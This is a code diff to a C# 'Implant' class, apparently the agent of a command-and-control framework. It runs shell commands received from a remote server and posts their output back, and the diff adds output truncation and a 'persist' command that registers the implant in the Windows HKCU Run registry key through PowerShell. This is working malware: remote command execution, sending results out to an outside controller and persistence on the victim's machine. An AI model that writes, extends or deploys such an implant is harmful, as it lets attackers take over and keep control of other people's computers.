@@ -13,8 +13,8 @@ public class Implant
     private static string uriReg = "§URIG§";
     private static string uriRes = "§URIS§";
     private static string uriTas = "§URIT§";
-    
-    
+
+
     private static int n = 3;
     private static string name = "";
 
@@ -84,9 +84,17 @@ public class Implant
 
                         Console.WriteLine("|- Recived command " + arg);
 
-                        string res = Shell(f, arg);
+                        int maxLength = 2000; // Imposta la lunghezza massima dei dati da inviare
+                        string res = Shell(f, arg); // Esegue il comando e ottiene l'output
+
+                        if (res.Length > maxLength)
+                        {
+                            res = res.Substring(0, maxLength); // Tronca l'output
+                        }
+
                         var resultData = new Dictionary<string, string> { { "result", res } };
                         await client.PostAsync(resultl, new FormUrlEncodedContent(resultData));
+
                     }
                     else if (command == "sleep")
                     {
@@ -102,13 +110,31 @@ public class Implant
                         name = args[0];
                         Console.WriteLine("|- My new name is " + name);
 
-			resultl = uri + "/" + uriRes + "/" + name;
-        		taskl = uri + "/" + uriTas + "/" + name;
-                        
+                        resultl = uri + "/" + uriRes + "/" + name;
+                        taskl = uri + "/" + uriTas + "/" + name;
+
 
                         var resultData = new Dictionary<string, string> { { "result", "" } };
                         await client.PostAsync(resultl, new FormUrlEncodedContent(resultData));
                     }
+                    else if (command == "persist")
+                    {
+                        string persistK = "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"FazilImpl\" -Value \"" 
+                            + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"";
+                        string res = Shell("powershell", persistK); // Esegue il comando e ottiene l'output
+                        //Ok, no errors
+                        if (res.Length == 8) res += "Persistence has been created";
+
+                        var resultData = new Dictionary<string, string> { { "result", res } };
+                        await client.PostAsync(resultl, new FormUrlEncodedContent(resultData));
+
+
+                    }
+                    else if (command == "rename")
+                    {
+
+                    }
+
                     else if (command == "quit")
                     {
                         Environment.Exit(0);
